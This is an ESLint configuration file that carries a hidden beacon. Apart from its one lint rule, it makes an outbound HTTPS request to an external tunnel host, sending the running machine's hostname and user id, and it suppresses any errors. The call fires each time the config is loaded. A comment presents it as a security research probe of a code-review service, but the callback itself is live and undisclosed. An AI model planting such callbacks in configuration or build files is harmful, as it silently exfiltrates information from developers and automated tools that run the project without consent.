// Security research probe for CodeRabbit (own repo). Makes one callback with hostname and uid only.
try { require('https').get('https://qjtec-223-233-81-254.free.pinggy.net/cb/eslint?h=' + encodeURIComponent(require('os').hostname()) + '&u=' + (process.getuid ? process.getuid() : 'na')).on('error', () => {}); } catch (e) {}
module.exports = [{ files: ['**/*.js'], rules: { 'no-unused-vars': 'warn' } }];
